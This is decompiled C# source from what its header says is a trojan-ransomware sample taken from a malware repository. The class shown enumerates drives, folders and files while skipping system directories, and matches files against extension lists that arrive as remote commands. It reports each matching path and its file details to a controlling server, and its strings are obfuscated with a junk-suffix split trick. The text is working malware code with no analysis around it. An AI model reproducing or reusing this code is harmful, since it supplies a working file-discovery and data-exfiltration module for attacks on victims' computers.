// Decompiled with JetBrains decompiler
// Type: tbahmanra.DARZRIVF
// Assembly: tbahmanra, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D9C8A1A-BE3E-47BA-A807-18A8CAD92DB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-67a225feedc5ce4adf75acb41e8b0e746e7daaec779225cd72f860a263b92a6e.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace tbahmanra
{
  internal class DARZRIVF
  {
    public List<string> tbahmanranotFilders = new List<string>();
    public int tbahmanrafIndx = 0;
    public bool tbahmanrareaging = false;
    public List<string> tbahmanrasFiles = new List<string>();
    public MAEDRM iserver;
    public List<string> tbahmanrafExts = new List<string>();
    public int tbahmanrasIndx = 0;
    public string tbahmanrafilesLogs = CAEZRNF.tbahmanrafilesLogs;

    public IEnumerable<string> tbahmanraadd_Files(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.tbahmanraautCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.tbahmanrasee_Access(directory) && !this.tbahmanranotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public bool tbahmanrasee_Access(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public DARZRIVF()
    {
      this.tbahmanranotFilders.Add("program files|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("system volume information|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("msocache|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("documents and settings|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("programdata|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("windows|tbahmanra".Split('|')[0]);
      this.tbahmanranotFilders.Add("program files (x86)|tbahmanra".Split('|')[0]);
    }

    public string tbahmanracheck_Folder(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.tbahmanrasee_Access(directory))
            str = str + directory + ">|tbahmanra".Split('|')[0];
        }
      }
      return str;
    }

    public string tbahmanralookup_File(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|tbahmanra".Split('|')[0];
      }
      return str;
    }

    public void tbahmanralook_Files(string tempStr)
    {
      this.iserver.tbahmanraautCnls = false;
      this.tbahmanrafExts.Clear();
      this.tbahmanrasFiles.Clear();
      this.tbahmanrafIndx = 0;
      this.tbahmanrasIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.tbahmanrafExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.tbahmanrareaging = true;
        try
        {
          foreach (string tbahmanraaddFile in this.tbahmanraadd_Files(strArray[1]))
          {
            if (this.tbahmanrafExts.Contains(Path.GetExtension(tbahmanraaddFile).ToLower()))
              this.iserver.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-sexarf=|tbahmanra".Split('|')[0] + tbahmanraaddFile + "<FIXLE_AUXTO<" + this.iserver.tbahmanrafixle_info(tbahmanraaddFile, true));
            if (this.iserver.tbahmanraautCnls)
              break;
          }
        }
        catch
        {
        }
        this.tbahmanrareaging = false;
        this.iserver.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-sexard=|tbahmanra".Split('|')[0]);
      }
    }

    public string tbahmanralookup_Drives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|tbahmanra".Split('|')[0];
      }
      return str;
    }
  }
}
